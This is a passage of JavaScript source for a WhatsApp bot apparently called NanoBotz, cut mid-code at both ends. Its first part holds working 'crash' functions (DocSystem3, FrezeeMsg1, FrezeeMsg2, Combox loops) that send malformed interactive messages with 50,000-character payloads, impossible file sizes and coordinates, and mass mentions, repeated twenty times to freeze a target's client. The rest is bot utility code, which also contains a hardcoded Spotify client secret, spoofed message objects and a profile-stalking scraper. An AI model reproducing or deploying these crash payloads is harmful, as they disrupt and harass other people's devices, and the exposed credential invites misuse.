                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "ＰＡＴＲＯＮ－ＭＤ",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "putzzdragons@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
async function DocSystem3(target) {
            NanoBotz.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "MOON TECH",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "ＰＡＴＲＯＮ－ＭＤ",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "NanoBotz@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
async function FrezeeMsg2(target) {
            let virtex = "⿻🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟⿻";
            let memekz = Date.now();

            await NanoBotz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ＰＡＴＲＯＮ－ＭＤ" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵⿻";

            NanoBotz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ＰＡＴＲＯＮ－ＭＤ CRASH👻👻" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target, Null)
await DocSystem2(target, Null)
await DocSystem3(target, Null)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
}
console.log(chalk.red.bold(`ＰＡＴＲＯＮ－ＭＤ CRASH👻👻${target}`))
}
async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
console.log(chalk.red.bold(`ＰＡＴＲＯＮ－ＭＤ CRASH👻👻${target}`))
}
async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
}
console.log(chalk.red.bold(`ＰＡＴＲＯＮ－ＭＤ CRASH👻👻${target}`))
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
NanoBotz.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await NanoBotz.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
NanoBotz.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
for (let BhosdikaXeon of NanoVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./data/assets/audio/${BhosdikaXeon}.mp3`)
NanoBotz.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of NanoSticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./data/NanoMedia/sticker/${BhosdikaXeon}.webp`)
NanoBotz.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageNano){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./data/NanoMedia/image/${BhosdikaXeon}.jpg`)
NanoBotz.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoNano){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./data/NanoMedia/video/${BhosdikaXeon}.mp4`)
NanoBotz.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
NanoBotz.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await NanoBotz.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await NanoBotz.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await NanoBotz.getName(i)}\nFN:${await NanoBotz.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await NanoBotz.readMessages([readkey]);
}

NanoBotz.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
NanoBotz.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
NanoBotz.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await NanoBotz.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await NanoBotz.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await NanoBotz.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await NanoBotz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
const nanochaty = `${budy}`
nanoai(pushname,nanochaty)
}
if (m.isGroup && isAutoAiGc) {
const nanochaty = `${budy}`
nanoai(pushname,nanochaty)
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */15 * * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Successfully deleted all Memories in the session folder")    
});
    })
}
if (!m.key.fromMe && m.isGroup && isnanochat) {
const nanochaty = `${budy}`
nanoai(pushname,nanochaty)
}
//=================================================================
if (!m.isGroup && !DanzTheCreator && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await NanoBotz.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
NanoBotz.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}


async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
